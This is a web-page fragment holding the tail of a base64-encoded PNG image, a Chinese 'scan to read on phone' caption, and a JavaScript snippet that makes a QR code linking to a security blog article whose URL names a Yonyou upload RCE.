+YLq+MDj1g8FVtfIJ5QkUB6OHuNCPsdLcC9nPOeXqEXjktA4MPSJyBWTf4BXSHPcN8dO4QL78Tb2apDjIiQMv/TLUPxDoNw3ufzuH1MKn0EYgNUBUice60mQk0PejWkhO60Ar6WnwEZ2wJHjFviF2MFdI90CuMAXbQ/9NHc6vHqQG9FJdsUCRQLvSWgfCzAUfEbUKeOyD9MD49hV9FJC61o6QGszoPuXa1xnKVyGcPwOGVtXuG1Kdyge5/qauV4LvBXKa0gIhORiomtCPIc0RRi1k7voxh/R4b3kgNUDUHapGpNaB4oB2swFRfQ01BzSPCiDXMG5vPEMhn9aB4mDU7huiU7kITgOBMa3VHmPCCvlg1ELmR4+8gdICY30WoUe4DtnfufBEOKc8+AitHYNXiNc6EB4/K3wK9XCE8x6qC5wG4k3+TL67rk5gD2R1Oh/Q+kDg/EpBajDesGBw2ndcuWNA+uRxhNRg9HVdOaRP68Djc2Id/FnAeY+zGvHR+xhw3w9yDajsDlXvJNB+MICBfSBu3PnnTqD/YqgJOkJOzjltteIg/TDQfascskb9A4/+4BSQfphRnkcIWVv5IDWgkifO9zqJJ4TXKN835OSwPkXvgXzq5E+e239TB9objPt0jZyD9MFA6fI7QvrkeYSQfpjxUa10f/6Rg9FXGsyctJ8gZL9HtZA+GLhvyKNTe7M+vanDmNZqL/4qVA5Zu6pzDdIPdFq9KgTaLQaWfmDy9QJL9Ayj+n/V5BxkP+eOtZAewG3fzv9vbsi3v/KLFuyBXGww/U392X3pqgLTtwVp3kscDD9k7j7lkBogqj9HvQK7aAnQvEa1NdCpqFWI1Dqw4oKPkOYY/Fm4D2h7ca7K9w2pTuWDXH9TX+0BcrpAt/mrAmjThxl7gSWqNaqn0gIh+0UeAbkGuh/ozw5PRBcfJDBq4Tyv2sC93z1wrwEu9zz2GtGJW7JvyO0QrvSxB3Kladz2snxTB9q3g7hWiltN+4DUgLaOT/I4Bn8WlQ9ozwTOyhrvtcqBVqt1YDPfPkFqMPBGt4/wKRpx+6R14G3ZPmCubcLtE5xrN7n/fgPDB5nHMxT7hsRpXSimN3VNyrHar+vKISfufpg515/J4bwHpAbr/5FLe3R85tmPPN7vmHst5D7dIx1SA8b/+/1r/ytO4P1Ufw+BMSX4Xq5ta/paO0oLdF558MeQtkKvkQ/G/qU/o8kTCKNHrCPUKzDWHjD7XY+aCJh9wSv2e4if2gXyPZALDMG30AeiK/MsepNVrn7ugby2zimH1ABRSwTaj7pA9+mZgUDXYbzxh9YLnkxg9DqWRD/FUXu0htG3D+RR0dbfcwLTQGBMC+b8T20L8lmr/noFBsJjf/QKrwdkHRByC6DfokbcPnnNbdk+Kg5GLdznrejwqerh3DSQQ/1evvkE9kDefOCPHvfSgUBeWX8ozJzrq9yvcuSQvYCyDGjfelyEey76KCA1rR29h3JIPyCqRPVxEZj2VvleOhDfwM7PT2ClvHQg1cTFQb5CYPzo6RuTzxGyxn3K3XfM5QmUFnkEZE8glqcBtFc0DKzM6u9Y+VYcjGe8dCCrh27tuRPYA3nunN7mmgbiV6/Kv7szyOv4qA5mn54PqWkdCMl5X5g514959ImArAOOlrYOT0RbHD4B07c2SC5qFIeytoTZNw2kOfenj51AHwjktOA5XO0YRg+9QhyrWukwaiFz+SHXMH4wgMFVviOn5wRK+w1Gn4iqB8x7q3zO9YE4ufPPncAeyOfOvnzy/wAAAP//z9AABAAAAAZJREFUAwBh5k+q2XVOJgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 